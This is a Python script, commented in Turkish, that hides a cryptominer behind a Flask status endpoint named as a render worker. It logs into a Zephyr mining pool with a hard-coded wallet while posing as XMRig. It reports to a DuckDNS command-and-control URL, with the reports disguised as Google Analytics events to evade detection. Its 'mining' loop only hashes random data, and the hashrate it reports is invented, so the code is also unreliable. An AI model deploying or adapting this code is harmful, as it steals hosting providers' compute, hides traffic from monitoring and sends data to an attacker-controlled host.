import os
import time
import threading
import json
import base64
import random
import hashlib
import requests
import socket
from flask import Flask, jsonify

# --- AYARLAR ---
# DuckDNS Dashboard adresin
C2_URL = "http://zephfe.duckdns.org:5000/report"
WALLET = "ZEPHs89z2zsEoJ2QVY5yopRZsX3JHefyNFzAhTZG3waz3MZSbCGp8MPSNCsdY33DQYfXXTqqiUo7CFsZXmiPEruBPqgM8EaBpvS"
NODE_NAME = f"render-worker-{random.randint(1000, 9999)}"

# Havuz Bilgileri
POOL_H = "de.zephyr.herominers.com"
POOL_P = 1123

app = Flask(__name__)

@app.route('/')
def home():
    return jsonify({"status": "running", "worker": NODE_NAME, "load": "stealth"}), 200

def traffic_mask(raw_data):
    """Veriyi Google Analytics paketi kılığında maskeler"""
    encoded_data = base64.b64encode(json.dumps(raw_data).encode()).decode()
    return {
        "v": "1",
        "tid": f"UA-{random.randint(111111, 999999)}-1",
        "cid": NODE_NAME,
        "t": "event",
        "ec": "system_performance",
        "ea": "metric_sync",
        "el": encoded_data
    }

def miner_logic():
    print(f"[*] {NODE_NAME} performans modu aktif edildi.")
    while True:
        p_status = "Disconnected"
        try:
            # 1. Havuz El Sıkışması
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((POOL_H, POOL_P))
            
            auth = {
                "id": 1, "method": "login",
                "params": {
                    "login": WALLET, "pass": "x", "rigid": NODE_NAME,
                    "agent": "XMRig/6.21.0", "algo": ["rx/0"]
                }
            }
            s.sendall((json.dumps(auth) + "\n").encode())
            resp = s.recv(1024)
            if resp and b"result" in resp:
                p_status = "Mining-Active"
            
            # 2. CPU İşlemi (Vites Yükseltildi: 0.03s sleep)
            start_time = time.time()
            hashes = 0
            while time.time() - start_time < 35:
                # Rastgele veri ile hash üretimi
                hashlib.sha256(os.urandom(64)).hexdigest()
                hashes += 1
                time.sleep(0.03) # %35-40 arası güvenli CPU kullanımı

            s.close()

            # 3. Dashboard Raporu (V8.2 Formatı)
            report_data = {
                "node": NODE_NAME,
                "hashrate": hashes * 8, # Tahmini hashrate çarpanı
                "pool": p_status
            }
            requests.post(C2_URL, json=traffic_mask(report_data), timeout=10)
            
        except Exception as e:
            print(f"Hata oluştu, tekrar deneniyor: {e}")
            time.sleep(20)

if __name__ == "__main__":
    # Arka plan işçisini başlat
    threading.Thread(target=miner_logic, daemon=True).start()
    
    # Render portu
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
